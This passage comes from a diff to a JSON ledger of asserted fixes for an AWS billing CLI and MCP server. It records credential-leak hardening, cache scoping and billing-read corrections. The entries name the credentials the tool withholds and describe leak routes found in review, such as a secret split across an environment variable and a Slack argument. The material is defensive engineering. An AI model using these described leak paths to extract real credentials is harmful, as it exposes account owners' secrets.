+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "func prepareHelper(cmd *exec.Cmd, stdin []byte) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "if !ok || awsCredentialVar(name) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "func awsCredentialVar(name string) bool { return !helperEnvAllowed(name) }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "if err := os.Chmod(outPath, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1HelperProcessesGetNoCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-credential-process-output-withheld",
+   "status": "active",
+   "summary": "While a credential retrieval runs, os.Stderr is the null device, so a credential_process (at any depth of the chain) prints nothing this program's output reaches before its answer is held; a process-provider error (which can quote the process's whole output) is replaced by a fixed text",
+   "why": "Codex r1 class secret-in-output-before-holder: the SDK hands a credential_process os.Stderr, and the output filter flushed what it printed before Retrieve returned and held the credential; an answer that did not parse was quoted in the error. Seen failing: seen/r1-secret-in-output-before-holder-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func quietCredentialProcesses() (func(), error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "os.Stderr = null",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "return v, credentialSourceError(err)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if errors.As(err, &pe) || strings.Contains(err.Error(), \"process provider error\") {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1CredentialProcessOutputWithheld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-cache-answers-only-its-request",
+   "status": "active",
+   "summary": "The local store answers a read only with what AWS answered for the same AWS account (sts:GetCallerIdentity; --data-source local: the account recorded for the named profile, or the only one), and for Cost Explorer the same dimension pair, granularity and every time period the request spans (stored whole from a complete answer, replaced whole); inventory and the account list are stored and read per account",
+   "why": "Codex r1 class cache-answer-not-the-request: a MONTHLY read summed DAILY and MONTHLY rows, a half-month answer was read as the month, and tenant A's cached bill or inventory answered tenant B's profile. In the same class (fixed with it): a period Cost Explorer marks Estimated (the current month) is never reused by an automatic read. Seen failing: seen/r1-cache-answer-not-the-request-seen-failing.log, seen/r1-cache-estimated-period-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "func costLines(ctx context.Context, o awsReadOpts, pr periodRange, kind costKind) ([]awsx.CostLine, string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "rows, covered, err := db.CostRowsIfCovered(ctx, scope, kind.id, pr.Granularity, costBuckets(pr), o.localOnly)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "AND (estimated = 0 OR ? = 1)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/costexplorer.go",
+     "contains": "ans.Buckets = append(ans.Buckets, CostBucket{Start: ps, End: pe, Estimated: rbt.Estimated})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "func (o awsReadOpts) readScope(ctx context.Context, db *store.Store) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "func localScope(db *store.Store, label string) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "func (s *Store) ReplaceCostBuckets(scope, kind, granularity string, buckets []CostBucket, rows []json.RawMessage) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/costexplorer.go",
+     "contains": "func (c *Client) GetCostAndUsageAnswer(ctx context.Context, start, end, granularity string, groupKeys []string) (CostAnswer, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "return costLines(ctx, o, pr, costByAccountService)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "func inventoryAccountMatches(scope, account string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "scope, _, serr := client.CallerIdentity(ctx)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "storeCostAnswer(db, scope, costByAccountService, o.granularity, canon)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "return nil, fmt.Errorf(\"resolving the account to scan: %w\", err)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/accounts_list.go",
+     "contains": "func storedAccounts(ctx context.Context, o awsReadOpts, db *store.Store, accountID string) ([]awsx.Account, bool, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1CostCacheAnswersOnlyTheRequest(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-breakdown-fetches-its-dimension",
+   "status": "active",
+   "summary": "bill --group-by usage-type and --group-by region read the Cost Explorer dimension pair that carries them (service x usage type, service x region); --account works with service or account only",
+   "why": "Codex r1 class requested-dimension-never-fetched: every breakdown read account x service lines, so a usage-type or region bill put the whole bill under (unattributed). Seen failing: seen/r1-requested-dimension-never-fetched-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/bill.go",
+     "contains": "kind = costByServiceUsage",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bill.go",
+     "contains": "kind = costByServiceRegion",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bill.go",
+     "contains": "lines, source, err := costLines(cmd.Context(), o, pr, kind)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1BillGroupByFetchesThatDimension(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-read-failure-never-empty",
+   "status": "active",
+   "summary": "A read that fails is an error, never an empty answer: every ask intent, the prior period of consolidated and report, a stored incomplete inventory scan (recorded per account and region), a refused Organizations account list; report shows a failed waste scan as unavailable",
+   "why": "Codex r1 class failure-read-as-an-empty-result: ask discarded Cost Explorer errors (DataUnavailableException, AccessDenied) and answered $0; consolidated and report read a failed prior period as $0 and +100%; waste read a stored scan whose CloudWatch check failed as no waste; accounts list read a refused list as no accounts. Seen failing: seen/r1-failure-read-as-an-empty-result-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/ask.go",
+     "not_contains": "_ := canonicalCostLines"
+    },
+    {
+     "file": "cli/internal/cli/consolidated.go",
+     "contains": "priorLines, _, err := canonicalCostLines(cmd.Context(), o, prev)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "priorLines, _, err := canonicalCostLines(ctx, o, prev)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "d.WasteError = werr.Error()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "contains": "func storedInventory(ctx context.Context, db *store.Store, scope, region, typeFilter, account string, wasteOnly bool) (inv []awsx.InventoryResource, ok bool, incomplete string, err error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "func (s *Store) RecordInventoryScan(scope, region string, complete bool, detail string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/accounts_list.go",
+     "contains": "organizations:ListAccounts denied: only the organization's management account",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1BillingReadFailureIsNeverAnEmptyBill(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-ask-keeps-caller-scope",
+   "status": "active",
+   "summary": "ask's data-transfer answer runs runWasteTransfer with the call's own period, database, profile and region",
+   "why": "Codex r1 class delegated-command-drops-caller-scope: ask ran a freshly built waste transfer command, whose flags were all defaults, so it answered this month for the default credentials and database whatever was asked. Seen failing: seen/r1-delegated-command-drops-caller-scope-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/ask.go",
+     "contains": "return runWasteTransfer(cmd, flags, o, pr, 0)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/waste_transfer.go",
+     "contains": "func runWasteTransfer(cmd *cobra.Command, flags *rootFlags, o awsReadOpts, pr periodRange, limit int) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ask.go",
+     "not_contains": "newNovelWasteTransferCmd(flags).RunE"
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1AskTransferKeepsTheCallersScope(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-copied-snapshot-not-orphan",
+   "status": "active",
+   "summary": "A snapshot's volume ID is information only (attrs source_volume, source_volume_found): snapshot waste is its age (over a year), never a missing source volume",
+   "why": "Codex r1 class wrong-field-from-a-documented-response: the EC2 Snapshot type says a copied snapshot's volume ID is arbitrary and must not be used for any purpose, yet a recent retained or cross-region backup copy was reported as an orphaned snapshot and monthly waste. Seen failing: seen/r1-wrong-field-from-a-documented-response-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "not_contains": "orphaned snapshot (source volume no longer exists)"
+    },
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "\"source_volume\": srcVol, \"source_volume_found\": fmt.Sprintf(\"%t\", liveVolumes[srcVol]),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1CopiedSnapshotIsNotOrphanWaste(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-day-presets-exact",
+   "status": "active",
+   "summary": "--period 7d / 30d ask Cost Explorer for exactly 7 / 30 whole days ending before today (End exclusive)",
+   "why": "Codex r1 class wrong-requested-time-window: the presets ended tomorrow, so 7d summed eight days and 30d thirty-one. Seen failing: seen/r1-wrong-requested-time-window-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "return periodRange{day(now).AddDate(0, 0, -7).Format(layout), day(now).Format(layout), \"last 7 days\", \"DAILY\"}, nil",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "return periodRange{day(now).AddDate(0, 0, -30).Format(layout), day(now).Format(layout), \"last 30 days\", \"DAILY\"}, nil",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_codex_r1_test.go",
+     "contains": "func TestR1DayPresetsSpanExactlyTheirDays(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-s3-bucket-region",
+   "status": "active",
+   "summary": "S3 buckets are listed with the paginated ListBuckets (MaxBuckets), so S3 returns each bucket's own BucketRegion, and are stored under it; a complete scan prunes the account's buckets in every region",
+   "why": "Codex r1 class wrong-resource-region: ListBuckets is account-wide and its answer carries BucketRegion only when the request has a parameter, so every bucket was stamped with the scan region (and the unpaginated form fails above the 10,000-bucket quota, Codex r1 P2). Seen failing: seen/r1-wrong-resource-region-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "p := s3.NewListBucketsPaginator(c.S3, &s3.ListBucketsInput{MaxBuckets: aws.Int32(1000)})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "Region:         aws.ToString(regionP),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_inventory.go",
+     "contains": "WHERE \"account_id\" = ? AND (\"region\" = ? OR \"resource_type\" = 's3')",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1S3BucketRegionIsTheBucketsOwn(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-helper-inputs-checked-together",
+   "status": "active",
+   "summary": "A helper's environment is an allowlist (system, locale, temp, display and proxy variables, XDG_*, LC_*, SLACK_*, the AWS region), and everything the helpers of one operation receive (that environment, every argument, stdin, a file a helper reads) is ONE unit the credential kit checks: a credential split between them is refused before any run starts",
+   "why": "Codex r2 (repeat of credential-handed-to-another-program, fixed after the stop rule, unreviewed): the environment and argv were checked apart, so REPORT_LABEL=<most of a credential> plus --slack-channel <the rest> reached Slack; and the round-1 environment check let one-character words of a full environment spell any held value, so every helper was refused once a credential was held. Seen failing: seen/r2-credential-handed-to-another-program-seen-failing.log. Kit adoption (credkit-wiring): the connector's piece matcher (HelperInputHoldsSecret) is gone; withheldByKit runs the joined unit through a kit Writer of the child-process sink. TestR2HelperGetsNoPieceOfAHeldCredential drives the r2 input (a credential split between REPORT_LABEL and --slack-channel) on the built binary; seen failing on the pre-kit tree.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "func helperEnvAllowed(name string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "var helperEnvPrefixes = []string{\"XDG_\", \"LC_\", \"SLACK_\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "func prepareHelpers(runs ...helperRun) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "if withheldByKit([]byte(strings.Join(unit, \"\\n\"))) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "_, err := credkit.NewWriter(&buf, credkit.SinkChild).Write(b)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_codex_r2_test.go",
+     "contains": "func TestR2HelperEnvironmentAndArgvAreCheckedTogether(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_codex_r2_test.go",
+     "contains": "func TestR2HelperStartsInAFullEnvironment(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/report_test.go",
+     "contains": "if strings.Contains(r[\"env\"], \"BB_CHILD_MARKER=\") {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r2_test.go",
+     "contains": "func TestR2HelperGetsNoPieceOfAHeldCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-cache-replaced-and-read-whole",
+   "status": "active",
+   "summary": "Every stored answer (Cost Explorer periods, an inventory scan with its prune, an account list) is replaced in ONE transaction and read in ONE transaction, so a reader sees a whole old answer or a whole new one and a failed replacement leaves the old one; an answer with a group key that repeats a held credential is refused whole by the kit's SQL driver, so its period stays uncovered",
+   "why": "Codex r2 (repeat of cache-answer-not-the-request, fixed after the stop rule, unreviewed): the replacement committed its deletion, each row and the coverage record separately, and a reader checked the record apart from reading the rows, so a concurrent sync could leave a covered $0 or partial bill. Codex r2 P2 fixed with it: a withheld storage ID left the row outside its answer's key. Seen failing: seen/r2-cache-answer-not-the-request-seen-failing.log, seen/r2-p2-withheld-rows-counted-as-covered-seen-failing.log. Kit adoption (credkit-wiring): the keyed withheld storage ID (storableID) is gone: the kit's SQL driver refuses the statement, the replacement rolls back, and the period is never read as covered with a group missing (TestR2WithheldGroupKeyLeavesThePeriodUncovered, seen failing with the kit's SQL driver unrouted).",
+   "asserts": [
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "func (s *Store) CostRowsIfCovered(ctx context.Context, scope, kind, granularity string, buckets []CostBucket, allowEstimated bool) ([]CostRow, bool, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "func (s *Store) ReplaceInventoryScan(scope, region string, rows []json.RawMessage, seen map[string]bool, complete bool, detail string) (int, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "func (s *Store) AccountListIfRecorded(ctx context.Context, scope, accountID string) ([]AccountRow, bool, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "if err := s.upsertKeyedTx(tx, \"costs\", r, prefixes, s.upsertCostsTx); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_scope.go",
+     "not_contains": "storableID"
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_codex_r2_test.go",
+     "contains": "func TestR2ReplacementIsAllOrNothing(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_codex_r2_test.go",
+     "contains": "func TestR2WithheldGroupKeyLeavesThePeriodUncovered(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal: the AWS credential variables and their aliases, the container authorization token and the MCP HTTP bearer (sent nowhere); the shared credentials file, the SSO and login token caches, the web identity and container token files and the press config as Files; the AWS config file's credential keys held by holdAWSConfig (the kit would hold every value of that file); SigV4's X-Amz-Security-Token and the SSO bearer as headers; the STS, SSO and container answers as response fields; AWS endpoints and the generated client's base_url as origins. Each main starts with credkit.Start and ends with credkit.Exit; the AWS SDK (every client and credential provider) and the generated, feedback, deliver and probe clients go through credkit.Transport; every credential the SDK retrieves is held (HoldMinted); every file write, the MCP stdio and HTTP servers, MCP tool calls and every child process go through the kit.",
+   "why": "Retires secret-echo-decoded-funnel, journal-credential-hardening, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, response-credentials-held, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, secure-container-is-credential, r1-holder-reads-every-part, r1-mixed-byte-escapes-decoded, r1-split-across-deliveries-withheld, api-origin-pinned, held-value-case-folded, output-units-reassembled, preclose-holder-numbers-and-cookies, preclose-escape-fixpoint, preclose-split-across-processes-and-protocol, refuse-held-uses-connector-chokepoint, output-derived-and-scheme-forms-matched-whole, g304-paths-cleaned-not-annotated, r1-short-value-encodings-withheld, r1-file-history-is-the-whole-file, r2-short-value-nested-encodings, aws-credentials-held, config-file-holds-no-credential, bb-store-split-halves, bb-value-cut-before-chokepoint, bb-split-across-tool-results, bb-own-output-shown, r1-holder-reads-every-sdk-source, r2-holder-reads-as-the-sdk: replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). That layer (the awsbilling_* holder, output chokepoint and encoding detectors, the secret funnel, the SDK-ini credential reader, the journal credential checks, the store's withholding driver, the own-value marker) grew per review round because each sink and encoding was closed one at a time. The kit is one shared implementation of docs/credential-leak-contract.md, checked byte for byte against tools/maintainer/credkit (vendor_credkit.py --check). The black-box suite (internal/awsbillingblackbox) drives the built CLI and MCP binaries against a fake AWS that echoes held values: every source signs and every sink writes, no sink carries an echoed credential, startup output never shows a malformed file's credential, and the Codex r2 inputs (credential-handed-to-another-program, holder-incomplete, cache-answer-not-the-request) were each seen failing on the pre-kit tree or with the kit sink unrouted. Known limits, documented: a custom CA bundle is refused, a container credential endpoint that needs an authorization token over plain http is refused by the kit, and the kit does not check output file names.",
+   "spec_encode_followup": "Press-side: generate the kit wiring and the Declarations literal; give the AWS SDK an http.Client whose transport is credkit.Transport.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"AWS_SECRET_ACCESS_KEY\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"AWS_CONTAINER_AUTHORIZATION_TOKEN\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"AWS_BILLING_MCP_HTTP_TOKEN\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Files:  credentialFiles,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialHeaders: []string{\"X-Amz-Security-Token\", \"X-Amz-Sso_bearer_token\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"env:AWS_BILLING_MCP_HTTP_TOKEN\", Allowed: nil},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"config:auth_header\", Allowed: []string{\"base_url\"}},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "homes := credkit.FlagValues(args, \"--home\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "add(holdAWSConfig(p)...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.Hold(\"config:\"+key, vals...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)\n\tcredkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "not_contains": "server.ServeStdio("
+    },
+    {
+     "file": "cli/cmd/aws-billing-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "sendClient.Transport = OutboundGuard(httpClient.Transport)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile+\".platform.json\", data, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.HoldBody(bodyBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "HoldMinted    = credkit.Hold",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "return &http.Client{Transport: OutboundGuard(tr)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "HoldMinted(\"minted:aws-credentials\", v.AccessKeyID, v.SecretAccessKey, v.SessionToken)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "credkit.WriteFile(tmp.Name(), []byte(htmlDoc), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "_, err := credkit.NewWriter(&buf, credkit.SinkChild).Write(b)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, err := credkit.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "var outFile *credkit.Writer",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "client := &http.Client{Timeout: 15 * time.Second, Transport: credkit.Transport(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "if err := credkit.WriteFile(tmp, body, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "return credkit.WriteFile(path, nil, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "return credkit.WriteFile(path, []byte(strings.Join(kept, \"\\n\")+\"\\n\"), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.HoldBody(data)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if err := credkit.WriteFile(tmp, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.NewWriter(f, credkit.SinkFile).Write([]byte{'\\n'})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "if err := credkit.WriteFile(tmpName, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.NewWriter(file, credkit.SinkFile).Write(key)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "_ = credkit.WriteFile(path, []byte(strconv.FormatInt(time.Now().UnixNano(), 10)), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/filelock.go",
+     "contains": "credkit.NewWriter(f, credkit.SinkFile).Write([]byte{0})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "if err := credkit.WriteFile(tmpPath, data, fileMode); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/darwin_acl_darwin.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "_ = credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/credkit_seam_test.go",
+     "contains": "OutboundGuard = func(rt http.RoundTripper) http.RoundTripper { return rt }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_seam_test.go",
+     "contains": "awsx.OutboundGuard = identity",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/sources_test.go",
+     "contains": "func TestEverySourceSignsAndEverySinkWrites(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/sources_test.go",
+     "contains": "func TestNoSinkCarriesAnEchoedCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestGeneratedClientNeverLeavesItsOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/startup_test.go",
+     "contains": "func TestStartupOutputNeverShowsAMalformedFileCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1HolderReadsEverySDKCredentialSource(t *testing.T) {",
